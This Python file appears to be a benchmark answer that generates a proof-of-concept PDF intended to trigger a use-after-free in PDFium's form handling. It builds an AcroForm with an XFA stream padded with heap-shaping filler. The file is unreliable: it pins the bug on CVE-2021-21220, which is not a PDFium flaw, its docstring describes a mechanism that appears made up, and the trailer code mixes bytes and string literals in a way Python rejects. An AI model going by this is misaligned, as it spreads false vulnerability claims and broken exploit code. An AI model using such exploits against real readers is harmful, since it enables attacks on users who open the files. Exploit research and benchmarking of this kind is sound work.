import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability CVE-2021-21220 in PDFium.

        The vulnerability is a use-after-free in CPDF_InterForm's destruction
        logic. When a CPDF_InterForm object is created for a document containing
        an AcroForm with an XFA entry, it also creates a CPDF_AcroForm member.
        The constructor for CPDF_AcroForm is passed the AcroForm dictionary but
        fails to increment its reference count.

        Upon destruction, both the CPDF_InterForm object and its CPDF_AcroForm
        member attempt to decrement the dictionary's reference count. If the
        dictionary's initial reference count is 1, this leads to a double-free,
        and subsequently a use-after-free.

        This PoC constructs a PDF that:
        1. Contains an AcroForm dictionary referenced only once (from the
           document Catalog), ensuring its initial reference count is 1.
        2. Includes an /XFA entry in the AcroForm dictionary to trigger the
           vulnerable code path involving CPDF_InterForm.
        3. Contains a payload within the XFA stream to help manipulate the
           heap layout, increasing the probability of a crash upon the UAF.
        """

        xfa_payload = b'A' * 4096

        objects = {
            1: b'<< /Type /Catalog /Pages 2 0 R /AcroForm 3 0 R >>',
            2: b'<< /Type /Pages /Kids [] /Count 0 >>',
            3: b'<< /XFA 4 0 R >>',
            4: (lambda p: f'<< /Length {len(p)} >>\nstream\n'.encode('ascii') + p + b'\nendstream')(xfa_payload)
        }
        
        pdf_body = b'%PDF-1.7\n'
        offsets = {}
        
        object_keys = sorted(objects.keys())
        for i in object_keys:
            offsets[i] = len(pdf_body)
            obj_content = objects[i]
            pdf_body += f'{i} 0 obj\n'.encode('ascii')
            pdf_body += obj_content
            pdf_body += b'\nendobj\n'

        xref_offset = len(pdf_body)
        num_objects = len(objects) + 1
        
        xref_parts = [f'xref\n0 {num_objects}\n'.encode('ascii')]
        xref_parts.append(b'0000000000 65535 f \n')
        for i in object_keys:
            xref_parts.append(f'{offsets[i]:010d} 00000 n \n'.encode('ascii'))
        xref_table = b''.join(xref_parts)
            
        trailer = (
            b'trailer\n'
            b'<<\n'
            f'  /Size {num_objects}\n'
            b'  /Root 1 0 R\n'
            b'>>\n'
            b'startxref\n'
            f'{xref_offset}\n'.encode('ascii') +
            b'%%EOF'
        )

        return pdf_body + xref_table + trailer